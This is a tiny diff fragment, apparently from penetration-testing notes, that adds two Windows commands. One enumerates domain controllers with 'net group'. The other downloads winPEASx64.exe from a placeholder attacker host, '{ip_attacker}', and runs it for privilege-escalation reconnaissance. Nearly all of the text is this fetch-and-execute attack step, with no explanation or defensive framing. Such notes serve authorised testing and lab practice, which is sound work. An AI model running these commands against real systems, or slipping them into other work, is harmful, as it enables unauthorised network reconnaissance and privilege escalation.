@@ -1,0 +1,4 @@
+Net group "Domain Controllers" /domain
+wget http://{ip_attacker}/winPEASx64.exe -OutFile winPEASx64.exe; .\winPEASx64.exe
+
+
